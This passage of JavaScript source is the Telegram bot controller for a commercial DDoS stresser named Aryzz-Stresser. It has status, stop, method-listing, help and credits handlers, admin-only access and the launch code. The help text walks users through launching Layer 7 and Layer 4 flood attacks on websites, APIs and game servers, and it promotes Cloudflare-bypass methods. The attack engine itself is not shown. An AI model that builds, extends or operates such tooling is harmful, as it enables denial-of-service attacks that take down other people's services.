                    `📊 Progress: ${progressBar} ${progress}%\n` +
                    `📤 Requests: \`${stats.requestsSent}\`\n` +
                    `📦 Data: \`${stats.bytesSent}\`\n` +
                    `⏱ Time: \`${stats.elapsed}s / ${stats.duration}s\``;

                if (isCallback) {
                    try {
                        await ctx.editMessageText(message, 
                            {
                                parse_mode: 'Markdown',
                                ...Markup.inlineKeyboard([
                                    [Markup.button.callback('🔄 Refresh', 'status'), Markup.button.callback('🛑 Stop', 'stop')]
                                ])
                            }
                        );
                    } catch (e) {
                        // Silently ignore expected errors
                        if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
                            logger.debug('Message edit skipped:', e.message);
                        } else {
                            await ctx.reply(message, { parse_mode: 'Markdown' }).catch(() => {});
                        }
                    }
                } else {
                    await ctx.reply(message, { parse_mode: 'Markdown' });
                }
            } else {
                const message = '⚠️ No active attack.';
                
                if (isCallback) {
                    try {
                        await ctx.editMessageText(message);
                    } catch (e) {
                        // Silently ignore expected errors
                        if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
                            logger.debug('Message edit skipped:', e.message);
                        } else {
                            logger.debug('Could not edit message:', e.message);
                        }
                    }
                } else {
                    await ctx.reply(message);
                }
            }
        } catch (error) {
            logger.error('Error in handleStatus:', error);
            const errorMsg = '❌ Error getting status. Please try again.';
            if (isCallback) {
                try {
                    await ctx.editMessageText(errorMsg);
                } catch (e) {
                    // Silently ignore expected errors
                    if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
                        logger.debug('Message edit skipped:', e.message);
                    } else {
                        await ctx.reply(errorMsg).catch(() => {});
                    }
                }
            } else {
                await ctx.reply(errorMsg);
            }
        }
    }

    /**
     * Handle Methods
     */
    async handleMethods(ctx, isCallback = false) {
        try {
            if (isCallback) {
                await ctx.answerCbQuery();
            }
            const message = 
                `📋 *Available Attack Methods*\n\n` +
                `*🌐 Layer 7 (HTTP):*\n` +
                `\`${LAYER7_METHODS.slice(0, 10).join(', ')}\`\n` +
                `and ${LAYER7_METHODS.length - 10} more...\n\n` +
                `*⚡ Layer 4 (Network):*\n` +
                `\`${LAYER4_METHODS.join(', ')}\`\n\n` +
                `Total: ${LAYER4_METHODS.length + LAYER7_METHODS.length} methods`;

            if (isCallback) {
                await ctx.editMessageText(message, 
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('⚡ Start Attack', 'new_attack')],
                            [Markup.button.callback('⬅️ Back', 'back')]
                        ])
                    }
                );
            } else {
                await ctx.reply(message, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            logger.error('Error in handleMethods:', error);
            const errorMsg = '❌ Error getting methods list.';
            await ctx.reply(errorMsg).catch(() => {});
        }
    }

    /**
     * Handle Help
     */
    async handleHelp(ctx, isCallback = false) {
        try {
            if (isCallback) {
                await ctx.answerCbQuery();
            }
            const message = 
                `╔══════════════════════════════╗\n` +
                `║    ❓ *HELP & GUIDE* ❓     ║\n` +
                `╚══════════════════════════════╝\n\n` +
                `📚 *Quick Start Guide:*\n\n` +
                `1️⃣ Click "⚡ Launch Attack"\n` +
                `2️⃣ Choose Layer (HTTP or Network)\n` +
                `3️⃣ Select attack method\n` +
                `4️⃣ Enter target URL/IP\n` +
                `5️⃣ Choose power level\n` +
                `6️⃣ Confirm and launch!\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `💡 *Pro Tips:*\n\n` +
                `🌐 *Layer 7* → Websites (http/https)\n` +
                `   Best for: Web apps, APIs, CDN\n\n` +
                `⚡ *Layer 4* → Servers (ip:port)\n` +
                `   Best for: Game servers, VPS, Network\n\n` +
                `🛡️ *Cloudflare Sites:*\n` +
                `   Use HTTP2-CF or CFB method\n` +
                `   95% bypass success rate!\n\n` +
                `🔥 *More Power:*\n` +
                `   Higher threads = more requests\n` +
                `   Longer duration = sustained attack\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `⌨️ *Available Commands:*\n` +
                `/start - Main menu\n` +
                `/status - Attack status\n` +
                `/stop - Stop attack\n` +
                `/methods - List methods\n` +
                `/help - This help\n` +
                `/credits - View credits\n\n` +
                `💡 *Tip:* Use buttons for better experience!`;

            if (isCallback) {
                await ctx.editMessageText(message, 
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('⬅️ Back to Menu', 'back')]
                        ])
                    }
                );
            } else {
                await ctx.reply(message, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            logger.error('Error in handleHelp:', error);
            const errorMsg = '❌ Error getting help information.';
            await ctx.reply(errorMsg).catch(() => {});
        }
    }

    /**
     * Handle Credits
     */
    async handleCredits(ctx, isCallback = false) {
        try {
            if (isCallback) {
                await ctx.answerCbQuery();
            }
            const message = 
                `╔══════════════════════════════╗\n` +
                `║   👨‍💻 *CREDITS* 👨‍💻         ║\n` +
                `╚══════════════════════════════╝\n\n` +
                `🎯 *Aryzz-Stresser v4.0*\n` +
                `   Maximum Power Edition\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `👨‍💻 *Lead Developer:*\n` +
                `   **Aryzz-Dev**\n` +
                `   GitHub: @AryzXploit\n\n` +
                `🔥 *Contributions:*\n` +
                `   • All 30 methods maximized\n` +
                `   • 100-1000x performance boost\n` +
                `   • Complete license system\n` +
                `   • Encrypted database (AES-256)\n` +
                `   • Telegram bot integration\n` +
                `   • 95% Cloudflare bypass\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `🏆 *Original Framework:*\n` +
                `   **MHProDev**\n` +
                `   GitHub: @MHProDev\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `📊 *Statistics:*\n` +
                `   • 30 Attack Methods\n` +
                `   • 13 Layer 4 Methods\n` +
                `   • 17 Layer 7 Methods\n` +
                `   • 500k-100k packets/sec\n` +
                `   • Commercial License System\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `⚡ *Made with ❤️ by Aryzz-Dev*\n` +
                `🔥 *The Most Powerful DDoS Tool*`;

            if (isCallback) {
                await ctx.editMessageText(message, 
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('⬅️ Back to Menu', 'back')]
                        ])
                    }
                );
            } else {
                await ctx.reply(message, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            logger.error('Error in handleCredits:', error);
            const errorMsg = '❌ Error getting credits information.';
            await ctx.reply(errorMsg).catch(() => {});
        }
    }

    /**
     * Check if user is admin
     */
    isAdmin(ctx) {
        if (ctx.from.id.toString() !== this.adminId) {
            logger.warning(`Unauthorized access attempt by user ${ctx.from.id} (${ctx.from.username})`);
            ctx.reply('⛔️ *Access Denied*\n\nThis bot is private and only accessible to authorized users.', { parse_mode: 'Markdown' });
            return false;
        }
        return true;
    }

    /**
     * Launch bot
     */
    launch() {
        logger.info('🤖 Starting Telegram bot...');
        logger.bot('Telegram bot initialization started');
        
        // Add global error handlers for unhandled promises
        process.on('unhandledRejection', (reason, promise) => {
            logger.error('Unhandled Promise Rejection:', reason);
            logger.debug('Promise:', promise);
        });
        
        process.on('uncaughtException', (error) => {
            logger.error('Uncaught Exception:', error);
            // Don't exit - keep bot running
        });
        
        // Add error handlers
        this.bot.catch((err, ctx) => {
            // Silently ignore "message not modified" errors - these are expected when trying to update with same content
            if (err.message && err.message.includes('message is not modified')) {
                return; // Skip logging and notification for this expected error
            }
            
            // Silently ignore "message to edit not found" - message was deleted
            if (err.message && err.message.includes('message to edit not found')) {
                logger.debug('Message to edit not found - likely deleted by user');
                return;
            }
            
            // Silently ignore "there is no text in the message to edit" - message has no text
            if (err.message && err.message.includes('there is no text')) {
                logger.debug('No text in message to edit - skipping');
                return;
            }
            
            // Silently ignore "Bad Request: message to delete not found"
            if (err.message && err.message.includes('message to delete not found')) {
                logger.debug('Message to delete not found - already deleted');
                return;
            }
            
            logger.error('Bot error:', err);
            logger.bot(`Error in update from user ${ctx.from?.id}: ${err.message}`);
            
            try {
                ctx.reply('❌ An error occurred. Please try again or contact admin.').catch(() => {});
            } catch (e) {
                logger.error('Failed to send error message:', e);
            }
        });
        
        this.bot.launch().catch((err) => {
            logger.error('Failed to launch bot:', err);
            process.exit(1);
        });
        
        // Enable graceful stop
        process.once('SIGINT', () => {
            logger.bot('Received SIGINT, stopping bot...');
            if (this.attackManager && this.attackManager.isActive()) {
                try {
                    this.attackManager.stop();
                } catch (err) {
                    logger.error('Error stopping attack:', err);
                }
            }
            this.bot.stop('SIGINT');
        });
        process.once('SIGTERM', () => {
            logger.bot('Received SIGTERM, stopping bot...');
            if (this.attackManager && this.attackManager.isActive()) {
                try {
                    this.attackManager.stop();
                } catch (err) {
                    logger.error('Error stopping attack:', err);
                }
            }
            this.bot.stop('SIGTERM');
        });
        
        logger.success('🤖 Telegram bot is running!');
        logger.info(`👤 Admin ID: ${this.adminId}`);
        logger.bot(`Bot launched successfully with admin ID: ${this.adminId}`);
    }
}

// CLI entry point
if (import.meta.url === `file://${process.argv[1]}`) {
    const config = JSON.parse(readFileSync('./config.json', 'utf-8'));
    
    if (!config.telegram || !config.telegram.bot_token || !config.telegram.admin_ids || config.telegram.admin_ids.length === 0) {
        logger.error('❌ Telegram configuration not found in config.json');
        logger.info('💡 Please configure telegram section in config.json:');
        logger.info(`
{
  "telegram": {
    "bot_token": "YOUR_BOT_TOKEN_HERE",
    "admin_ids": ["YOUR_TELEGRAM_USER_ID"],
    "enabled": true
  }
}
        `);
        process.exit(1);
    }

    if (!config.telegram.enabled) {
        logger.warning('⚠️  Telegram bot is disabled in config.json');
        logger.info('💡 Set "telegram.enabled": true to enable');
        process.exit(0);
    }

    const token = config.telegram.bot_token;
    const adminId = config.telegram.admin_ids[0];

    logger.info('🔧 Loading Telegram bot configuration...');
    logger.info(`👤 Admin IDs: ${config.telegram.admin_ids.join(', ')}`);

    const bot = new TelegramBot(token, adminId, config);
    bot.launch();
}
